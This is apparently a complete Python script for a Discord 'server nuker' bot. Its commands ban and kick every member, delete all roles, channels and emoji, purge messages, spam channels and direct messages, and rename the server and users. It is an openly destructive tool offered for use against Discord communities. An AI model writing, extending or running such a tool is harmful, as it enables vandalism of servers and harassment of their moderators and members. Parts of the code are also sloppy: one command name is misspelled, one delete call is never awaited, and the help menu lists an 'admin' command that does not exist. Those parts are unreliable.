import discord, os, sys, json, random, string, requests, subprocess, ctypes
from discord.ext import commands
from discord import Permissions
from colorama import Fore, init
os.system('cls')
init()

with open('Configs/config_server.json') as f:
    config = json.load(f)
    token = config['bot_token']
    prefix = config['prefix']

ctypes.windll.kernel32.SetConsoleTitleW(f'[Server Nuker] Coded by')

client = commands.Bot(command_prefix=prefix)

client.remove_command('help')

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.dnd, activity=discord.Game('Gamma Nuker | http://nykz.xyz'))
    print(f"""{Fore.RED}
                                         _   _       _          ____        _   
                                        | \ | |_   _| | _____  | __ )  ___ | |_ 
                                        |  \| | | | | |/ / _ \ |  _ \ / _ \| __|
                                        | |\  | |_| |   <  __/ | |_) | (_) | |_ 
                                        |_| \_|\__,_|_|\_\___| |____/ \___/ \__|

{Fore.RED}[{Fore.WHITE}LOGIN{Fore.RED}] Loggin as{Fore.WHITE}: {client.user.name}
{Fore.RED}[{Fore.WHITE}INFO{Fore.RED}] Type command {prefix}help for help command""")

@client.event
async def on_server_join(server):
    print(f"{Fore.RED}[{Fore.WHITE}JOIN{Fore.RED}] Join on {server.name}")

@client.command()
async def spam(ctx, amount, message):
    send = 0
    await ctx.message.delete()
    for _i in range(int(amount)):
        send += 1
        await ctx.send(message)
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Send message {message} #{send}")
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully spam on channel{Fore.WHITE}.")

@client.command()
async def banall(ctx):
    ban = 0
    await ctx.message.delete()
    print(f"{Fore.WHITE}> {Fore.RED}Running banall{Fore.WHITE}...")
    for member in ctx.guild.members:
        try:
            ban += 1
            await member.ban()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ban{Fore.WHITE}: {member}")
        except:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully banned {ban} members{Fore.WHITE}.")

@client.command()
async def unballall(ctx):
    unban = 0
    await ctx.message.delete()
    print(f"{Fore.WHITE}> {Fore.RED}Running unbanall{Fore.WHITE}...")
    for member in ctx.guild.bans:
        try:
            unban += 1
            await member.unban()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Unban{Fore.WHITE}: {member}")
        except Exception as e:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully unban {unban} members{Fore.WHITE}.")

@client.command()
async def kickall(ctx):
    kick = 0
    await ctx.message.delete()
    print(f"{Fore.WHITE}> {Fore.RED}Running kickall{Fore.WHITE}...")
    for member in ctx.guild.members:
        try:
            kick += 1
            await member.kick()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ban{Fore.WHITE}: {member}")
        except:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully kick {kick} members{Fore.WHITE}.")

@client.command()
async def delete_role(ctx):
    await ctx.message.delete()
    print(f"{Fore.WHITE}> {Fore.RED}Running Delete Roles{Fore.WHITE}...")
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            await role.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Delete role {role}")
        else:
            break
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully delete roles{Fore.WHITE}.")

@client.command()
async def create_role(ctx, text, amount):
    await ctx.message.delete()
    print(f"{Fore.WHITE}> {Fore.RED}Running Create Roles{Fore.WHITE}...")
    for i in range(int(amount)):
        await ctx.guild.create_role(name=f"{text}")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Create role {text} #{i}")
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully create roles {text}{Fore.WHITE}.")

@client.command()
async def channel_create(ctx, message, amount):
    print(f"{Fore.WHITE}> {Fore.RED}Running Create Channels{Fore.WHITE}...")
    for i in range(int(amount)):
        await ctx.guild.create_text_channel(message)
        await ctx.guild.create_voice_channel(message)
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Create channel {message}")
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully created channel{Fore.WHITE}.")

@client.command()
async def channel_delete(ctx):
    print(f"{Fore.RED}> {Fore.WHITE}Running Delete Channels{Fore.WHITE}...")
    for channel in ctx.guild.channels:
        await channel.delete()
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Delete channel {channel}")
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully deleted channel{Fore.WHITE}.")

@client.command()
async def dmall(ctx, *, msg = None):
    await ctx.message.delete()
    if msg != None:
        for member in ctx.guild.members:
            try:
                if member.dm_channel != None:
                    await member.dm_channel.send(msg)
                    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Send message to {member}")
                else:
                    await member.create_dm()
                    await member.dm_channel.send(msg)
                    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Send message to {member}")
            except:
                continue
    else:
        await ctx.send('Message?')
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully send message to members{Fore.WHITE}.")

@client.command()
async def random_nickall(ctx):
    await ctx.message.delete()
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Change nickname {member} to {nickname}")
        except Exception as e:
            continue
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully change nicknames{Fore.WHITE}.")

@client.command()
async def nickall(ctx):
    await ctx.message.delete()
    nickname = input(f"{Fore.WHITE}> {Fore.RED}Name{Fore.WHITE}: ")
    print(f"{Fore.WHITE}> {Fore.RED}Running nickall{Fore.WHITE}...")
    for member in ctx.guild.members:
        try:
            await member.edit(nick=nickname)
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Change nickname {member} to {nickname}")
        except Exception as e:
            print(e)
            input()
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully change nicknames{Fore.WHITE}.")

@client.command()
async def clear(ctx):
    for tc in ctx.guild.text_channels:
        while tc.last_message != None:
            await tc.purge(bulk=True)
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully clear channel{Fore.WHITE}.")

@client.command()
async def emojidel(ctx):
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Emoji delete")
        except:
            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Error")
    print(f"{Fore.WHITE}> {Fore.RED}Successyfully delete emoji{Fore.WHITE}.")

@client.command()
async def guildname(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)
  print(f"{Fore.WHITE}> {Fore.RED}Change guild name to {name}")

@client.command()
async def cate(ctx, name, amount=2):
    await ctx.message.delete()
    guild = ctx.message.guild
    for i in range(amount):
        await guild.create_category(name=f"{name}")
        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Categories create {name}")
    print(f"{Fore.WHITE}> {Fore.RED}Category successyfully created{Fore.WHITE}.")

@client.command()
async def leave(ctx):
 await ctx.message.delete
 await ctx.guild.leave()
 print(f"{Fore.WHITE}> {Fore.RED}Leave server{Fore.WHITE}.")

@client.command()
async def logout(ctx):
    await ctx.send('Logout...')
    sys.exit()

@client.command()
async def cls(ctx):
    await ctx.message.delete()
    os.system("cls")

@client.command()
async def help(ctx):
    await ctx.message.delete()
    print(f"""{Fore.RED}{prefix}admin - Give all users admin
{prefix}banall - Ban all users
{prefix}spam [amount] [message] - Spam message on channel
{prefix}kickall - Kick all users from server
{prefix}delete_role - Delete all roles from servers
{prefix}create_role [name] [amount] - Create role in server
{prefix}channel_create [name] [amount] - Create channels in server
{prefix}channel_delete - Delete all channels in server
{prefix}dmall [message] - Send message to all users
{prefix}random_nickall - Set random nickname all users
{prefix}nickall [name] - Set custom nickname all users
{prefix}clear - Clear all message from channel
{prefix}emojidel - Delete all emoji from server
{prefix}guildname [name] - Set name guild
{prefix}cate [name] [amount] - Create categories on server
{prefix}leave - Leave server
{prefix}logout - Logout from app (close app)
{prefix}cls - Clear console
    """)


try:
    client.run(token)
except Exception:
    pass
except KeyboardInterrupt:
    sys.exit()